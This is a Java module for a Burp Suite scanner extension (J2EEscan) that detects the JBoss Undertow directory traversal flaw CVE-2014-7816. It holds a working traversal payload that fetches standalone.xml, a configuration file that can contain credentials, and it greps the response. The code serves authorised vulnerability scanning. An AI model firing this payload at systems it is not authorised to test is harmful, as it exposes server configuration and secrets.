package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import static burp.HTTPMatcher.getMatches;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;

/**
 * 
 * CVE-2014-7816
 * 
 * Directory traversal vulnerability in JBoss Undertow 1.0.x before 1.0.17, 1.1.x before 1.1.0.CR5, 
 * and 1.2.x before 1.2.0.Beta3, when running on Windows, allows remote attackers 
 * to read arbitrary files via a .. (dot dot) in a resource URI.	
 * 
 * https://bugzilla.redhat.com/show_bug.cgi?id=1157478
 * https://issues.jboss.org/browse/WFLY-4020
 * 
 */
public class UndertowTraversal implements IModule {
 
    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();

    private static final String TITLE = "JBoss Undertow Directory Traversal";
    private static final String DESCRIPTION = "J2EEscan identified the JBoss Undertow "
            + "directory traversal vulnerability.<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://bugzilla.redhat.com/show_bug.cgi?id=1157478<br />"
            + "https://issues.jboss.org/browse/WFLY-4020";
 
    private static final String REMEDY = "Update the software with the last security patches";
 
    
    private static final List<String> JBOSS_PATHS = Arrays.asList(
            "/..\\\\standalone\\\\configuration\\\\standalone.xml"
    );

    /**
     * <?xml version='1.0' encoding='UTF-8'?>
     * <server xmlns="urn:jboss:domain:1.5">
	<extensions>
		<extension module="org.jboss.as.clustering.infinispan" />
		<extension module="org.jboss.as.clustering.jgroups" />
		<extension module="org.jboss.as.cmp" />
		[...]
     */

    private static final List<byte[]> GREP_STRINGS = Arrays.asList(
            "<server".getBytes()
    );
 
    private PrintWriter stderr;

 
    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();

        String system = host.concat(Integer.toString(port));

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);

            String protocol = url.getProtocol();
            Boolean isSSL = (protocol.equals("https"));

            for (String JBOSS_PATH : JBOSS_PATHS) {

                try {

                    URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), JBOSS_PATH);
                    byte[] jbosstest = helpers.buildHttpRequest(urlToTest);

                    byte[] response = callbacks.makeHttpRequest(url.getHost(),
                            url.getPort(), isSSL, jbosstest);

                    IResponseInfo jbossUndertowInfo = helpers.analyzeResponse(response);

                    if (jbossUndertowInfo.getStatusCode() == 200) {

                        // look for matches of our active check grep string
                        for (byte[] GREP_STRING : GREP_STRINGS) {

                            List<int[]> matches = getMatches(response, GREP_STRING, helpers);

                            if (matches.size() > 0) {

                                    callbacks.addScanIssue(new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            new URL(protocol, url.getHost(), url.getPort(), JBOSS_PATH),
                                            new CustomHttpRequestResponse(jbosstest, response, baseRequestResponse.getHttpService()),
                                            TITLE,
                                            DESCRIPTION,
                                            REMEDY,
                                            Risk.Medium,
                                            Confidence.Certain
                                    ));
                            }
                        }
                    }

                } catch (MalformedURLException ex) {
                    stderr.println("Malformed URL Exception " + ex);
                }
            }
        }

        return issues;
    }

}
